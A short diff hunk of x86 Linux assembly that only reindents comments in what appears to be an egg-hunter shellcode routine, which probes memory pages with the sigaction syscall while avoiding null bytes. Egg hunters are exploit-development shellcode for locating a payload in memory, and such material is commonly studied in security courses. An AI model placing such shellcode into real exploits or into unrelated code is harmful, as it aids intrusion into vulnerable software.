@@ -8,13 +8,13 @@ global _start
 
 section .text
 _start:
-	cld 				; clear direction flag in preparation for scasd 
-	xor edx,edx			; clear edx
-	xor ecx,ecx			; clear ecx
+	cld 		; clear direction flag in preparation for scasd 
+	xor edx,edx	; clear edx
+	xor ecx,ecx	; clear ecx
 align_page:
     or cx,0xfff         ; page alignment at 4095 - avoid explicit 4096 nullbyte
 next_address:
-    inc ecx				; bring it at 4096 - default linux page size
+    inc ecx		; bring it at 4096 - default linux page size
     push byte +0x43     ; sigaction(2) value
     pop eax             ; store syscall identifier in eax
     int 0x80            ; call sigaction(2)
